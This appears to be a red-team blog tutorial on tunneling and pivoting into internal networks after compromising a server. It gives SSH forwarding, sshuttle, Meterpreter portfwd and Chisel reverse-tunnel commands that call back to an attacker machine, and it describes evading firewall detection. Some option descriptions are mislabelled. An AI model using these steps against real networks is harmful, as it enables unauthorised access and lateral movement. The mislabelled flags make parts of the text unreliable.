---
title: "Tunneling, Pivoting to Attack Internal Network"
date: 2021-07-30T18:17:00+07:00
draft: false
categories: [
    "Offensive Security"
]
tags: [
    "Tunel", "Pivot", "Tool",
]
---
## Intro
- There are plenty of articles and blogs on the Internet talking about attacking and penetrating internal networks, but most of them focus on using the tools, while the principles and scenarios are rarely mentioned or explained much. In this post I'll discuss the principles of attacking internal networks in various ways, flexibly designing an internal-network attack diagram to match the different internal-network scenarios. This is also one of my favorite topics in cybersecurity and red team operations in general.

- Attacking and penetrating an internal network means using various *tunnel* technologies to get past the firewall's blocking and detection, using protocols the firewall allows, to gain access to the blocked target network.

- *Tunnel* technology is a way to transmit data between networks using the Internet's infrastructure. The data transmitted through a *tunnel* can be data *frames* or *packages* of different protocols. The *tunnel protocol* re-encapsulates the data *frames* or data *packages* of these other *protocols* inside a new *header* for transmission. The new *header* provides routing information so that the encapsulated data can be transmitted over the Internet. The encapsulated data packages are routed between the two *endpoints* of the *tunnel* through the internet. The logical path along which the encapsulated data package is transmitted over the Internet is called a *tunnel*. At the end, the data is decapsulated and forwarded to the final destination. Note that tunnel technology refers to the whole process including encapsulating, transmitting and decapsulating the data.

- The *tunnel* technologies we commonly use to penetrate internal networks include dns tunnel, http tunnel, ssh tunnel, icmp (ping) tunnel and other protocols the firewall allows.

- These tunnel technologies can be classified by protocol layer:
  - Netword layer tunnel: ICMP tunnel, etc.
  - Transport layer tunnel: TCP tunnel, UDP tunnel
  - Application layer tunnel: HTTP, DNS, SSH and other tunnels
## Tools for Tunneling
### SSH Tunnel
- Since this is an important part and extremely useful in practice, I'll go into detail about it. It belongs to the Application layer tunnel.
#### Local Port Forwarding
- `ssh [USER@]SSH_SERVER -L [LOCAL_IP:]LOCAL_PORT:DESTINATION:DESTINATION_PORT`\
-> All traffic to [LOCAL_IP:]LOCAL_PORT will be forwarded to DESTINATION:DESTINATION_PORT through the ssh tunnel

- `ssh [USER@]SSH_SERVER -L [LOCAL_IP:]LOCAL_PORT:DESTINATION:DESTINATION_PORT -L [LOCAL_IP2:]LOCAL_PORT2:DESTINATION2:DESTINATION_PORT2`\
-> Multi local port forwarding

- `ssh user@10.66.66.4 -CNfg -L 13389:127.0.0.1:3389`\
-> All traffic to 13389 on localhost will be forwarded to 127.0.0.1:3389 on the server

- `ssh user@10.66.66.4 -CNfg -L 13389:10.9.9.123:3389`\
-> All traffic to 13389 on localhost will be forwarded to 10.9.9.123:3389 if the server can connect to 10.9.9.123:3389

- `ssh user@103.81.86.132 -p 9123 -CNfg -L 13389:10.9.9.123:3389`\
-> You can forward the ssh port from local up to a public server (remote port forwarding) so that everyone from the outside can connect to 10.9.9.123:3389 (the local network)

- `ssh user@103.81.86.132 -p 9123 -CNfg -L 13389:10.9.9.123:3389 -L 13390:10.9.9.123:3390 -L 13391:10.9.9.123:3391`\
-> Example of multi local port forwarding\
- **Local port forwarding is commonly used to pull a port from the server or from within the server's network -> local**

- **Practical example**
- Scenario:\
      &nbsp;&nbsp;&nbsp;&nbsp;[KALI]&nbsp;&nbsp;&nbsp;&nbsp;<===>&nbsp;&nbsp;&nbsp;&nbsp;[Debian]&nbsp;&nbsp;&nbsp;&nbsp;<===>&nbsp;&nbsp;&nbsp;&nbsp;[Windows Server]\
10.10.10.10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;192.168.10.10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;172.16.10.10\
     -----------------------X-------------------------------------->   tcp/445\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--------------V--------->   tcp/445\
     -----------V-----------------> tcp/22
- In this case: once we exploit and take control of the target's server 192.168.10.10. 172.16.10.10 is an internal server, with no internet connection and unable to connect to the outside network. Suppose it has port 445 open. So how can we exploit and enum its information from our machine?
- From KALI : `ssh -N -L 0.0.0.0:4445:172.16.10.10:445 root@192.168.10.10`
- After using this command on the KALI machine, we can access 172.16.10.10:445 from `localhost:445`
#### Remote Port Forwarding
- `ssh -R [REMOTE:]REMOTE_PORT:DESTINATION:DESTINATION_PORT [USER@]SSH_SERVER`\
-> All traffic to [REMOTE:]REMOTE_PORT on the server will be forwarded to DESTINATION:DESTINATION_PORT (client)

- `ssh user@remote.host -CNfg -R 8080:127.0.0.1:3000`\
-> All traffic to port 8080 on the server will be forwarded to 127.0.0.1:3000 on your machine

- `ssh -tt -R 3389:localhost:3389 root@103.81.86.132 -p 9020 ssh -L 103.81.86.132:3389:127.0.0.1:3389 root@localhost -p 9020`\
-> For example, you have a public server. You can use this command to pull port 3389 from local up to the server so that everyone from the internet can connect to it (in this case remote desktop). Since remote port forwarding by default only forwards to the 127.0.0.1 interface, we'll use one more local port forwarding command to move the traffic through the public interface.

- **Remote port forwarding is commonly used to pull a port from local or from within the local network -> server**

- **Practical example**
- Scenario:\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[KALI]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Debian]               
103.81.86.132&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;172.16.10.10      
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(Compromised)\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----------X----------> tcp/22\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----------X----------> tcp/3306\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ANY <------V--------------
- From Debian : `ssh -N -R 103.81.86.132:2221:127.0.0.1:3306 kali@10.10.10.10`
- Now on Kali, when traffic comes to tcp / 2221, it will be routed to tcp / 3306 on Debian
#### Dynamic Port Forwarding
- `ssh -D [LOCAL_IP:]LOCAL_PORT [USER@]SSH_SERVER`
- `ssh -CNfg -D 127.0.0.1:7777 root@192.168.1.1`
-> At this point 127.0.0.1:7777 will act as a SOCKS proxy forwarding all traffic through it to the server's network
- **Dynamic port forwarding is used to create a SOCKS proxy to access any IP and port on the server network through the SOCKS proxy**

- **Practical example**
- Scenario:\
&nbsp;&nbsp;&nbsp;[KALI]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<===>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Debian]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<===>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Windows Server]\
10.10.10.10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;192.168.10.10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;172.16.10.10\
-------------------------X-------------------------------------->   tcp/445\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--------------V--------->   tcp/445\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--------------V--------->   tcp/any\
     -----------V-----------------> tcp/22
- From Kali: `ssh -N -D 127.0.0.1:8080 user@192.168.10.10`
- At this point 127.0.0.1:8080 acts as a SOCKS proxy forwarding all traffic through it to the network that 192.168.10.10 can connect to.
- For http traffic you can use FoxyProxy; for other traffic you can use proxychains
- Configure /etc/proxychains.conf:
```bash 
...
socks4 127.0.0.1 8080
```
- nmap scan through proxychains: `proxychains --top-ports -sT -Pn 172.16.10.10`
#### Options
- Options:\
-C Requests compression of all data (including stdin, stdout, stderr, and data for forwarded X11 and TCP connections)\
-N Do not execute a remote command. This is useful for just forwarding ports\
-g Allows remote hosts to connect to local forwarded ports.\
-L Local port forwarding\
-R Local port forwarding\
-D Local port forwarding (SOCKS proxy)\
-p port
#### Sshuttle
- A very nice tool we can also use is sshuttle (https://github.com/sshuttle/sshuttle)
- Install
  - Debian    : `apt-get install sshuttle -y`
  - Rpm-based : `yum install sshuttle`
- Usage
  - `sshuttle -r USERNAME@SERVER_IP 0.0.0.0/0 -vv` (all connections will go through the server)
  - `sshuttle -r sean@10.11.1.251 10.1.1.27` (create a direct connection to 10.1.1.27 through the intermediary 10.11.1.251)
  - `sshuttle -r sean@10.11.1.251 10.1.1.27/24` (create a direct connection to 10.1.1.27/24 through the intermediary 10.11.1.251)\
  - `nmap -Pn -v -sT -sV -p 22,80,443,21,25 10.1.1.27/24` (you can use nmap to scan directly without going through a proxy, like ssh dynamic port forwarding)
#### Note
- In practice, suppose you have access to a server through a web or application vulnerability but we don't have ssh login credentials. You can absolutely generate a key pair from the server and ssh in using its private key with the `-i` option, like the first part of this post of mine :\
https://tranquac.com/posts/2021/06/linux-backdoors/
### Netword Layer Tunnel
- I'll introduce some tools you can research and practice with on your own
- ICMP tunnel:
  - icmpsh (https://github.com/bdamele/icmpsh)
  - icmptunnel (https://github.com/DhavalKapil/icmptunnel)
  - pingtunnel (https://www.mit.edu/afs.new/sipb/user/golem/tmp/ptunnel-0.61.orig/web/)
### Transport Layer Tunnel
- TCP tunnel, UDP tunnel:
  - netcat
  - powercat
  - socat
  - netsh
  - lcx
  - NATBypass
  - iox
### Application Layer Tunnel
- HTTP, DNS, SSH and other tunnels. I already covered SSH in great detail above.
  - dnscat2
  - dnscat2-powershell
  - dns2tcp
  - iodine
  - reGeorg
  - Neo-reGeorg
  - reDuh
  - Tunna
  - ABPTTS
  - EarthWorm
  - Termite
  - Venom
  - ssocks
  - s5.go
### Other tools pivoting without SSH
#### Metasploit Framework
- Once you have a meterpreter shell you can easily use it to create a tunnel. You don't need credentials like with SSH. With SSH we must have a login account or the server's SSH private key to be able to connect and create a tunnel.
```bash
meterpreter > portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]
OPTIONS:
     -L >opt>  The local host to listen on (optional).
     -h        Help banner.
     -l >opt>  The local port to listen on.
     -p >opt>  The remote port to connect on.
     -r >opt>  The remote host to connect on.
meterpreter >
```
```bash
meterpreter > portfwd add –l 3389 –p 3389 –r 172.16.194.191
[*] Local TCP relay created: 0.0.0.0:3389 >-> 172.16.194.191:3389
meterpreter > 
```
-> Creates a tunnel forwarding all traffic to port 3339 on localhost to 172.16.194.191 through the pivot, which is the machine currently holding the meterpreter shell. It's similar to SSH local port forwarding.
```bash
meterpreter > portfwd delete –l 3389 –p 3389 –r 172.16.194.191
[*] Successfully stopped TCP relay on 0.0.0.0:3389
meterpreter > 
```
-> Remove a tunnel
- List all tunnels : `meterpreter > portfwd list`
- Delete all tunnels : `portfwd flush`
- See more details at : https://www.offensive-security.com/metasploit-unleashed/portfwd/
#### Chisel
- A fast TCP/UDP tunnel over HTTP (https://github.com/jpillora/chisel)
- Typical usage: for example Kali or another attacking machine has IP 10.10.15.13, and the client machine has IP 10.10.10.10.
- On the attacking machine, start a chisel server listening on port 8000: 
```bash
./chisel server -p 8000 --reverse
```
- On the client machine:
| Command                                                  | Description                                                     |
| --------------------------------------------             | ---------------------------------------------------------       |
| chisel client 10.10.15.13:8000 R:80:127.0.0.1:80 R:389:localhost:389          | Listen on Kali 80,389, forward to localhost port 80,389 on client       |
| chisel client 10.10.15.13:8000 R:4444:10.10.10.214:80    | Listen on Kali 4444, forward to 10.10.10.214 port 80            |
| chisel client 10.10.15.13:8000 R:socks                   | Create SOCKS5 listener on 1080 on Kali, proxy through client    |
- Note that Chisel must run on both the server and the client
#### Ssf
- https://github.com/securesocketfunneling/ssf
## Create SOCKS Proxy to Attack Internal Network
### Ssh
- [Dynamic Port Porwarding](#dynamic-port-forwarding)
- You can also create a SOCKS proxy that is your own machine: `ssh user@localhost -CNfg -D 9000`
- [Sshuttle](#sshuttle)
### Powershell
- https://www.varonis.com/blog/nmap-reverse-proxies/
- https://tokyoneon.github.io/
- https://github.com/tokyoneon/Invoke-SocksProxy
### RDP
1. **Client**: Register the `UDVC-Plugin.dll` on the system (https://github.com/earthquake/UniversalDVC#installation)
2. **Client**: connect via `RDP` to the server (by default it will create the virtual channel on all RDP connections, by binding the TCP port 31337)
3. Copy `UDVC-Server.exe` and the `SSF package` on the remote server
4. **Server**: execute `ssfd.exe -p 9898`
5. **Server**: execute `UDVC-Server.exe -c -p 9898 -i 127.0.0.1`
6. **Client**: execute `ssf.exe -D 9999 -p 31337 127.0.0.1`\
-> At this point you will have the socks server listening on port 9999 of your client.
### Metasploit Framework
- https://www.offensive-security.com/metasploit-unleashed/proxytunnels/
### Cobalt Strike
- https://www.cobaltstrike.com/help-socks-proxy-pivoting
### HTTP
- https://blog.csdn.net/qq_34801745/article/details/108896857
### DNS
- http://blog.dengxj.com/archives/14/
### ICMP
- https://blog.csdn.net/qq_34801745/article/details/108896857
## Refer
- https://blog.csdn.net/qq_34801745/article/details/108896857
- https://blog.csdn.net/qq_34801745/article/details/109022922
- https://www.ms509.com/2020/06/17/Intranet-penetration/
- https://techblog.mediaservice.net/2019/10/remote-desktop-tunneling-tips-tricks/
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md



  




